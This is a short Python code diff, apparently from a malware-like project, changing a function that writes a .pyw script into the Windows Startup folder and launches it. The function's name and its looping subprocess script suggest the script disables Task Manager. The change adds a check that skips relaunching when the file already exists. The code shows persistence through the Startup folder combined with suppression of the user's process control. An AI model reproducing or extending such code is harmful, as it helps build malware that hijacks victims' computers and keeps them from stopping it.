@@ -10,6 +10,8 @@ def no_taskmgr():
 
     no_taskmgr_path = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\no_taskmgr.pyw"
 
+    already_exists = os.path.exists(no_taskmgr_path)
+    
     with open(no_taskmgr_path, 'w', encoding='utf-8') as fw:
         fw.write('''
 import subprocess, time
@@ -27,7 +29,8 @@ while True:
 ''')
 
     try:
-        subprocess.Popen([sys.executable, no_taskmgr_path], shell=False)
+        if not already_exists:
+            subprocess.Popen([sys.executable, no_taskmgr_path], shell=False)
     except Exception:
         pass
 
